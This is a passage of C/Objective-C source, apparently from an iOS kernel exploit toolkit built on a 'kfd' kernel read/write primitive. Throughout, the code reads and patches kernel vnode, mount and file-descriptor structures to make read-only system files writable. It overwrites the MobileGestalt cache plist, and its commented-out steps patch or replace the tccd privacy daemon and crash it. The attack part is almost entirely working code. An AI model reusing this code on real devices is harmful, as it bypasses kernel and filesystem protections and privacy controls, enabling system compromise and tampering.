    uint64_t from_v_freelist_tqe_prev = kread64(kfd, from_vnode + 0x18); //v_freelist.tqe_prev
    printf("[i] %s from_vnode->v_freelist.tqe_prev: 0x%llx\n", from, from_v_freelist_tqe_prev);
    uint64_t from_v_mntvnodes_tqe_next = kread64(kfd, from_vnode + 0x20);   //v_mntvnodes.tqe_next
    printf("[i] %s from_vnode->v_mntvnodes.tqe_next: 0x%llx\n", from, from_v_mntvnodes_tqe_next);
    uint64_t from_v_mntvnodes_tqe_prev = kread64(kfd, from_vnode + 0x28);  //v_mntvnodes.tqe_prev
    printf("[i] %s from_vnode->v_mntvnodes.tqe_prev: 0x%llx\n", from, from_v_mntvnodes_tqe_prev);
    uint64_t from_v_ncchildren_tqh_first = kread64(kfd, from_vnode + 0x30);
    printf("[i] %s from_vnode->v_ncchildren.tqh_first: 0x%llx\n", from, from_v_ncchildren_tqh_first);
    uint64_t from_v_ncchildren_tqh_last = kread64(kfd, from_vnode + 0x38);
    printf("[i] %s from_vnode->v_ncchildren.tqh_last: 0x%llx\n", from, from_v_ncchildren_tqh_last);
    uint64_t from_v_nclinks_lh_first = kread64(kfd, from_vnode + 0x40);
    printf("[i] %s from_vnode->v_nclinks.lh_first: 0x%llx\n", from, from_v_nclinks_lh_first);
    uint64_t from_v_defer_reclaimlist = kread64(kfd, from_vnode + 0x48);    //v_defer_reclaimlist
    printf("[i] %s from_vnode->v_defer_reclaimlist: 0x%llx\n", from, from_v_defer_reclaimlist);
    uint32_t from_v_listflag = kread32(kfd, from_vnode + 0x50);    //v_listflag
    printf("[i] %s from_vnode->v_listflag: 0x%x\n", from, from_v_listflag);
    uint64_t from_v_cred_pac = kread64(kfd, from_vnode + off_vnode_v_cred);
    uint64_t from_v_cred = from_v_cred_pac | 0xffffff8000000000;
    printf("[i] %s from_vnode->v_cred: 0x%llx\n", from, from_v_cred);
    
    uint64_t from_devvp = kread64(kfd, from_v_mount + off_mount_mnt_devvp);
    printf("[i] %s from_vnode->v_mount->mnt_devvp: 0x%llx\n", from, from_devvp);
    uint64_t from_devvp_nameptr = kread64(kfd, from_devvp + off_vnode_v_name);
    uint64_t from_devvp_name = kread64(kfd, from_devvp_nameptr);
    printf("[i] %s from_vnode->v_mount->mnt_devvp->v_name: %s\n", from, &from_devvp_name);
    uint64_t from_devvp_vu_specinfo_pac = kread64(kfd, from_devvp + off_vnode_vu_specinfo);
    uint64_t from_devvp_vu_specinfo = from_devvp_vu_specinfo_pac | 0xffffff8000000000;
    printf("[i] %s from_devvp->vu_specinfo: 0x%llx\n", from, from_devvp_vu_specinfo);
    uint32_t from_devvp_vu_specinfo_si_flags = kread32(kfd, from_devvp_vu_specinfo + off_specinfo_si_flags);
    printf("[i] %s from_devvp->vu_specinfo->si_flags: 0x%x\n", from, from_devvp_vu_specinfo_si_flags);
    
    
    //Get Parent until "mobile. "/var/mobile"
    uint64_t from_vnode_parent = kread64(kfd, from_vnode + off_vnode_v_parent) | 0xffffff8000000000;
    uint64_t from_vnode_parent_nameptr = kread64(kfd, from_vnode_parent + off_vnode_v_name);
    uint64_t from_vnode_parent_name = kread64(kfd, from_vnode_parent_nameptr);
    printf("[i] %s from_vnode_parent->v_name: %s\n", from, &from_vnode_parent_name);
    
    from_vnode_parent = kread64(kfd, from_vnode_parent + off_vnode_v_parent) | 0xffffff8000000000;
    from_vnode_parent_nameptr = kread64(kfd, from_vnode_parent + off_vnode_v_name);
    from_vnode_parent_name = kread64(kfd, from_vnode_parent_nameptr);
    printf("[i] %s from_vnode_parent->v_name: %s\n", from, &from_vnode_parent_name);
    
    from_vnode_parent = kread64(kfd, from_vnode_parent + off_vnode_v_parent) | 0xffffff8000000000;
    from_vnode_parent_nameptr = kread64(kfd, from_vnode_parent + off_vnode_v_name);
    from_vnode_parent_name = kread64(kfd, from_vnode_parent_nameptr);
    printf("[i] %s from_vnode_parent->v_name: %s\n", from, &from_vnode_parent_name);
    
    from_vnode_parent = kread64(kfd, from_vnode_parent + off_vnode_v_parent) | 0xffffff8000000000;
    from_vnode_parent_nameptr = kread64(kfd, from_vnode_parent + off_vnode_v_name);
    from_vnode_parent_name = kread64(kfd, from_vnode_parent_nameptr);
    printf("[i] %s from_vnode_parent->v_name: %s\n", from, &from_vnode_parent_name);
    
    from_vnode_parent = kread64(kfd, from_vnode_parent + off_vnode_v_parent) | 0xffffff8000000000;
    from_vnode_parent_nameptr = kread64(kfd, from_vnode_parent + off_vnode_v_name);
    from_vnode_parent_name = kread64(kfd, from_vnode_parent_nameptr);
    printf("[i] %s from_vnode_parent->v_name: %s\n", from, &from_vnode_parent_name);
    
    from_vnode_parent = kread64(kfd, from_vnode_parent + off_vnode_v_parent) | 0xffffff8000000000;
    from_vnode_parent_nameptr = kread64(kfd, from_vnode_parent + off_vnode_v_name);
    from_vnode_parent_name = kread64(kfd, from_vnode_parent_nameptr);
    printf("[i] %s from_vnode_parent->v_name: %s\n", from, &from_vnode_parent_name);
    
    kwrite32(kfd, to_vnode + off_vnode_usecount, to_usecount + 1);
    kwrite32(kfd, to_vnode + off_vnode_v_kusecount, to_v_kusecount + 1);
    kwrite8(kfd, to_vnode + off_vnode_v_references, to_v_references + 1);
    
    kwrite64(kfd, to_vnode + off_vnode_v_data, kread64(kfd, from_vnode_parent + off_vnode_v_data));
    
//#define VFMLINKTARGET  0x20000000
//    kwrite32(kfd, from_vnode + off_vnode_vflags, kread32(kfd, from_vnode + off_vnode_vflags) & VFMLINKTARGET);
//
//    kwrite32(kfd, from_devvp_vu_specinfo + off_specinfo_si_flags, 0x0);
//    kwrite32(kfd, to_devvp_vu_specinfo + off_specinfo_si_flags, 0x0);
    
//    kwrite64(kfd, to_v_mount + off_mount_mnt_devvp, from_devvp);
//    kwrite64(kfd, to_v_mount + off_mount_mnt_data, kread64(kfd, from_v_mount + off_mount_mnt_data));
    
//    kwrite32(kfd, to_vnode + off_vnode_usecount, to_usecount + 1);
//    kwrite32(kfd, to_vnode + off_vnode_v_kusecount, to_v_kusecount + 1);
//    kwrite8(kfd, to_vnode + off_vnode_v_references, to_v_references + 1);
//    kwrite64(kfd, to_vnode + off_vnode_v_data, kread64(kfd, to_devvp + off_vnode_v_data));
//
//    close(file_index);
    
//    sleep(2);
    
    return 0;
}

enum vtype    { VNON, VREG, VDIR, VBLK, VCHR, VLNK, VSOCK, VFIFO, VBAD, VSTR,
              VCPLX };

uint64_t funVnodeResearch2(u64 kfd, char* file) {
    //16.1.2 offsets
    uint32_t off_p_pfd = 0xf8;
    uint32_t off_fd_ofiles = 0;
    uint32_t off_fp_fglob = 0x10;
    uint32_t off_fg_data = 0x38;
    uint32_t off_vnode_iocount = 0x64;
    uint32_t off_vnode_usecount = 0x60;
    uint32_t off_vnode_vflags = 0x54;
    uint32_t off_vnode_v_name = 0xb8;
    uint32_t off_vnode_v_mount = 0xd8;
    uint32_t off_vnode_v_data = 0xe0;
    uint32_t off_vnode_v_kusecount = 0x5c;
    uint32_t off_vnode_v_references = 0x5b;
    uint32_t off_vnode_v_parent = 0xc0;
    uint32_t off_vnode_v_label = 0xe8;
    uint32_t off_vnode_v_cred = 0x98;
    uint32_t off_vnode_vu_mountedhere = 0x68;
    uint32_t off_vnode_vu_socket = 0x70;
    uint32_t off_vnode_vu_specinfo = 0x78;
    uint32_t off_vnode_vu_fifoinfo = 0x80;
    uint32_t off_vnode_vu_ubcinfo = 0x88;
    uint32_t off_vnode_v_writecount = 0xb0;
    uint32_t off_vnode_v_type = 0x70;
    uint32_t off_mount_mnt_data = 0x11F;
    uint32_t off_mount_mnt_fsowner = 0x9c0;
    uint32_t off_mount_mnt_fsgroup = 0x9c4;
    uint32_t off_mount_mnt_devvp = 0x980;
    uint32_t off_specinfo_si_flags = 0x10;
    uint32_t off_fg_flag = 0x10;

    int file_index = open(file, O_RDONLY);

    if (file_index == -1) return -1;
    
    uint64_t proc = getProc(kfd, getpid());
    
    //get vnode
    uint64_t filedesc_pac = kread64(kfd, proc + off_p_pfd);
    uint64_t filedesc = filedesc_pac | 0xffffff8000000000;
    uint64_t openedfile = kread64(kfd, filedesc + (8 * file_index));
    uint64_t fileglob_pac = kread64(kfd, openedfile + off_fp_fglob);
    uint64_t fileglob = fileglob_pac | 0xffffff8000000000;
    uint64_t vnode_pac = kread64(kfd, fileglob + off_fg_data);
    uint64_t to_vnode = vnode_pac | 0xffffff8000000000;
    printf("[i] %s to_vnode: 0x%llx\n", file, to_vnode);
    
    uint16_t to_vnode_vtype = kread16(kfd, to_vnode + off_vnode_v_type);
    printf("[i] %s to_vnode->vtype: 0x%x\n", file, to_vnode_vtype);
    
    uint64_t to_v_mount_pac = kread64(kfd, findRootVnode(kfd) + off_vnode_v_mount);
    uint64_t to_v_mount = to_v_mount_pac | 0xffffff8000000000;
    
    uint32_t to_m_flag = kread32(kfd, to_v_mount + 0x70);
    
#define MNT_RDONLY      0x00000001      /* read only filesystem */
    kwrite32(kfd, to_v_mount + 0x70, to_m_flag & ~MNT_RDONLY);
//    kwrite16(kfd, to_v_mount + off_vnode_v_type, VNON);
    
    
    kwrite32(kfd, fileglob + off_fg_flag, O_ACCMODE);
    
    printf("[i] %s to_vnode->v_writecount: %d\n", file, kread32(kfd, to_vnode + off_vnode_v_writecount));
    kwrite32(kfd, to_vnode + off_vnode_v_writecount, kread32(kfd, to_vnode + off_vnode_v_writecount)+1);
    
    const char* data = "AAAAAAAAAAAAAAAAAAAAAAA";
    
    size_t data_len = strlen(data);

    off_t file_size = lseek(file_index, 0, SEEK_END);
    if (file_size == -1) {
        perror("Failed lseek.");
//        close(file);
//        return;
    }
    
    char* mapped = mmap(NULL, file_size, PROT_READ | PROT_WRITE, MAP_SHARED, file_index, 0);
    if (mapped == MAP_FAILED) {
        perror("Failed mmap.");
//        close(file);
//        return;
    }
    
    memcpy(mapped, data, data_len);
    
    munmap(mapped, file_size);
    
    
    kwrite32(kfd, to_v_mount + 0x70, to_m_flag);
    
    close(file_index);

    return 0;
}


uint64_t fun_ipc_entry_lookup(u64 kfd, mach_port_name_t port_name) {
    uint64_t proc = getProc(kfd, getpid());
    uint64_t proc_ro = kread64(kfd, proc + 0x18);
    
    uint64_t pr_proc = kread64(kfd, proc_ro + 0x0);
    printf("[i] self proc->proc_ro->pr_proc: 0x%llx\n", pr_proc);
    
    uint64_t pr_task = kread64(kfd, proc_ro + 0x8);
    printf("[i] self proc->proc_ro->pr_task: 0x%llx\n", pr_task);
    
    uint64_t itk_space_pac = kread64(kfd, pr_task + 0x300);
    uint64_t itk_space = itk_space_pac | 0xffffff8000000000;
    printf("[i] self task->itk_space: 0x%llx\n", itk_space);
    //NEED TO FIGURE OUR SMR POINTER!!!
    
//    uint32_t table_size = kread32(kfd, itk_space + 0x14);
//    printf("[i] self task->itk_space table_size: 0x%x\n", table_size);
//    uint32_t port_index = MACH_PORT_INDEX(port_name);
//    if (port_index >= table_size) {
//        printf("[!] invalid port name: 0x%x", port_name);
//        return -1;
//    }
//
//    uint64_t is_table_pac = kread64(kfd, itk_space + 0x20);
//    uint64_t is_table = is_table_pac | 0xffffff8000000000;
//    printf("[i] self task->itk_space->is_table: 0x%llx\n", is_table);
//    printf("[i] self task->itk_space->is_table read: 0x%llx\n", kread64(kfd, is_table));
//
//    const int sizeof_ipc_entry_t = 0x18;
//    uint64_t ipc_entry = is_table + sizeof_ipc_entry_t * port_index;
//    printf("[i] self task->itk_space->is_table->ipc_entry: 0x%llx\n", ipc_entry);
//
//    uint64_t ie_object = kread64(kfd, ipc_entry + 0x0);
//    printf("[i] self task->itk_space->is_table->ipc_entry->ie_object: 0x%llx\n", ie_object);
//
//    sleep(1);
    
    
    
    return 0;
}

int do_fun(u64 kfd) {
    uint64_t kslide = ((struct kfd*)kfd)->perf.kernel_slide;
    uint64_t kbase = 0xfffffff007004000 + kslide;
    printf("[i] Kernel base: 0x%llx\n", kbase);
    printf("[i] Kernel slide: 0x%llx\n", kslide);
    uint64_t kheader64 = kread64(kfd, kbase);
    printf("[i] Kernel base kread64 ret: 0x%llx\n", kheader64);
    
    pid_t myPid = getpid();
    uint64_t selfProc = getProc(kfd, myPid);
    printf("[i] self proc: 0x%llx\n", selfProc);
    
    funUcred(kfd, selfProc);
    funProc(kfd, selfProc);
    //funVnodeHide(kfd, "/System/Library/Audio/UISounds/photoShutter.caf");
    //funCSFlags(kfd, "launchd");
    //funTask(kfd, "kfd");
    
    //Patch
//    funVnodeChown(kfd, "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", 501, 501);
    //Restore
//    funVnodeChown(kfd, "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", 0, 0);
    
    
    //Patch
//    funVnodeChmod(kfd, "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", 0107777);
    //Restore
//    funVnodeChmod(kfd, "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", 0100755);
    
    mach_port_t host_self = mach_host_self();
    printf("[i] mach_host_self: 0x%x\n", host_self);
    fun_ipc_entry_lookup(kfd, host_self);
    
//    NSString *path = [NSString stringWithFormat:@"%@%@", NSHomeDirectory(), @"/Documents/abcd.txt"];
//    [[NSFileManager defaultManager] removeItemAtPath:path error:nil];
//    [@"Hello, this is an example file!" writeToFile:path atomically:YES encoding:NSUTF8StringEncoding error:nil];
    
    //NEW WAY, open with O_RDONLY AND PATCH TO O_RDWR, Actually we don't need to use funVnodeChown, funVndeChmod.
//    funVnodeChown(kfd, "/System/Library/CoreServices/SystemVersion.plist", 501, 501);
//    funVnodeChmod(kfd, "/System/Library/CoreServices/SystemVersion.plist", 0107777);
    //funVnodeResearch2(kfd, "/System/Library/Audio/UISounds/photoShutter.caf");
    //Restore permission
//    funVnodeChown(kfd, "/System/Library/CoreServices/SystemVersion.plist", 0, 0);
//    funVnodeChmod(kfd, "/System/Library/CoreServices/SystemVersion.plist", 0100444);
    

    
//    Redirect Folders: NSHomeDirectory() + @"/Documents/mounted" -> /var
      //NSString *cachePath = [NSString stringWithFormat:@"%@%@", NSHomeDirectory(), @"/Documents/cache"];
      //[[NSFileManager defaultManager] removeItemAtPath:cachePath error:nil];
      //[[NSFileManager defaultManager] createDirectoryAtPath:cachePath withIntermediateDirectories:NO attributes:nil error:nil];
      //funVnodeRedirectFolder(kfd, cachePath.UTF8String, "/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches/");
    //NSArray* dirs = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:mntPath error:NULL];
//    NSLog(@"/var directory: %@", dirs);
    
    //TODO: Redirect /System/Library/PrivateFrameworks/TCC.framework/Support/ -> NSHomeDirectory(), @"/Documents/mounted"
    
    //Redirect Folders: NSHomeDirectory() + @"/Documents/mounted" -> /var/mobile
//    funVnodeResearch(kfd, mntPath.UTF8String, mntPath.UTF8String);
//    dirs = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:mntPath error:NULL];
//    NSLog(@"[i] /var/mobile dirs: %@", dirs);
    
    
    
    
    //funVnodeOverwriteFile(kfd, mntPath.UTF8String, "/var/mobile/Library/Caches/com.apple.keyboards");
    funVnodeChown(kfd, "/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches/com.apple.MobileGestalt.plist", 501, 501);
    funVnodeChmod(kfd, "/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches/com.apple.MobileGestalt.plist", 0107777);
    [[NSFileManager defaultManager] copyItemAtPath:[NSString stringWithFormat:@"%@%@", NSBundle.mainBundle.bundlePath, @"/com.apple.MobileGestalt.plist"] toPath:[NSString stringWithFormat:@"%@%@", @"/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches"] error:nil];
    
//    symlink("/System/Library/PrivateFrameworks/TCC.framework/Support/", [NSString stringWithFormat:@"%@%@", NSHomeDirectory(), @"/Documents/Support"].UTF8String);
//    mount("/System/Library/PrivateFrameworks/TCC.framework/Support/", mntPath, NULL, MS_BIND | MS_REC, NULL);
//    printf("mount ret: %d\n", mount("apfs", mntpath, 0, &mntargs))
//    funVnodeChown(kfd, "/System/Library/PrivateFrameworks/TCC.framework/Support/", 501, 501);
//    funVnodeChmod(kfd, "/System/Library/PrivateFrameworks/TCC.framework/Support/", 0107777);
    
//    funVnodeOverwriteFile(kfd, mntPath.UTF8String, "/");
    
    
//    for(NSString *dir in dirs) {
//        NSString *mydir = [mntPath stringByAppendingString:@"/"];
//        mydir = [mydir stringByAppendingString:dir];
//        int fd_open = open(mydir.UTF8String, O_RDONLY);
//        printf("open %s, ret: %d\n", mydir.UTF8String, fd_open);
//        if(fd_open != -1) {
//            NSArray* dirs2 = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:mydir error:NULL];
//            NSLog(@"/var/%@ directory: %@", dir, dirs2);
//        }
//        close(fd_open);
//    }
//    printf("open ret: %d\n", open([mntPath stringByAppendingString:@"/mobile/Library"].UTF8String, O_RDONLY));
//    printf("open ret: %d\n", open([mntPath stringByAppendingString:@"/containers"].UTF8String, O_RDONLY));
//    printf("open ret: %d\n", open([mntPath stringByAppendingString:@"/mobile/Library/Preferences"].UTF8String, O_RDONLY));
//    printf("open ret: %d\n", open("/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches", O_RDONLY));
    
//    dirs = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:[mntPath stringByAppendingString:@"/mobile"] error:NULL];
//    NSLog(@"/var/mobile directory: %@", dirs);
    
//    [@"Hello, this is an example file!" writeToFile:[mntPath stringByAppendingString:@"/Hello.txt"] atomically:YES encoding:NSUTF8StringEncoding error:nil];
//    funVnodeOverwriteFile(kfd, "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", AAAApath.UTF8String);
//    funVnodeChown(kfd, "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", 501, 501);
//    funVnodeOverwriteFile(kfd, AAAApath.UTF8String, BBBBpath.UTF8String);
//    funVnodeOverwriteFile(kfd, "/System/Library/AppPlaceholders/Stocks.app/AppIcon60x60@2x.png", "/System/Library/AppPlaceholders/Tips.app/AppIcon60x60@2x.png");
    
//    xpc_crasher("com.apple.tccd");
//    xpc_crasher("com.apple.tccd");
//    sleep(10);
//    funUcred(kfd, getProc(kfd, getPidByName(kfd, "tccd")));
//    funProc(kfd, getProc(kfd, getPidByName(kfd, "tccd")));
//    funVnodeChmod(kfd, "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", 0100755);
    
    
//    funVnodeOverwrite(kfd, AAAApath.UTF8String, AAAApath.UTF8String);
    
//    funVnodeOverwrite(kfd, selfProc, "/System/Library/AppPlaceholders/Stocks.app/AppIcon60x60@2x.png", copyToAppDocs.UTF8String);


//Overwrite tccd:
//    NSString *copyToAppDocs = [NSString stringWithFormat:@"%@%@", NSHomeDirectory(), @"/Documents/tccd_patched.bin"];
//    remove(copyToAppDocs.UTF8String);
//    [[NSFileManager defaultManager] copyItemAtPath:[NSString stringWithFormat:@"%@%@", NSBundle.mainBundle.bundlePath, @"/tccd_patched.bin"] toPath:copyToAppDocs error:nil];
//    chmod(copyToAppDocs.UTF8String, 0755);
//    funVnodeOverwrite(kfd, selfProc, "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", [copyToAppDocs UTF8String]);
    
//    xpc_crasher("com.apple.tccd");
//    xpc_crasher("com.apple.tccd");

    
    return 0;
}
